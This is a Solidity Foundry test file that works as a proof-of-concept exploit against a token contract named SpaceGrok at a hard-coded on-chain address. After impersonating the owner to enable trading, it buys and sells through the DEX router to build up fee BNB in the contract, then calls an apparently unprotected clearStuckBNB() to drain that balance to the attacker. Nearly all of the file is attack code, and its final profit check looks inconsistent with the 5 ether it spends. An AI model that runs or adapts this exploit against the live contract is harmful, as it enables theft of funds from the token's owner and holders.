// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface SpaceGrok {
    function owner() external view returns (address);
    function enableTrading() external;
    function removeLimits() external;
    function updateSwapEnabled(bool) external;
    function uniswapV2Pair() external view returns (address);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function clearStuckBNB() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x58718Fd4567517d9a713a1f9f3de6cbF9404E59e;
    address attacker = address(this);
    SpaceGrok target = SpaceGrok(TARGET);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: We need to impersonate the owner to enable trading
        address owner = target.owner();
        vm.startPrank(owner);

        // Enable trading and swap
        target.enableTrading();
        target.removeLimits();
        target.updateSwapEnabled(true);

        // Stop impersonating owner
        vm.stopPrank();

        // Get some initial BNB for buying tokens
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialContractBalance = address(this).balance;

        // Step 1: Buy tokens to generate fees and accumulate BNB in contract
        // We need to buy through the DEX pair
        IUniswapV2Router02 router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address weth = router.WETH();

        // Buy tokens - swap ETH for tokens
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = address(target);

        // Execute swap
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 5 ether}(
            0, // amountOutMin
            path,
            attacker,
            block.timestamp
        );

        // Now sell some tokens back to generate fees and accumulate BNB in contract
        uint256 tokenBalance = target.balanceOf(attacker);
        require(tokenBalance > 0, "No tokens bought");

        // Approve router to spend our tokens
        target.approve(address(router), tokenBalance);

        // Sell half of tokens
        path[0] = address(target);
        path[1] = weth;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance / 2,
            0,
            path,
            attacker,
            block.timestamp
        );

        // At this point, the contract should have accumulated some BNB from fees
        // Now drain it using clearStuckBNB()
        // Record initial balance
        uint256 initialAttackerBalance = address(this).balance;

        // Call clearStuckBNB - this should send all BNB to msg.sender
        target.clearStuckBNB();

        // Check if we received BNB
        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialAttackerBalance, "No BNB drained");
        assertGt(finalBalance, initialContractBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

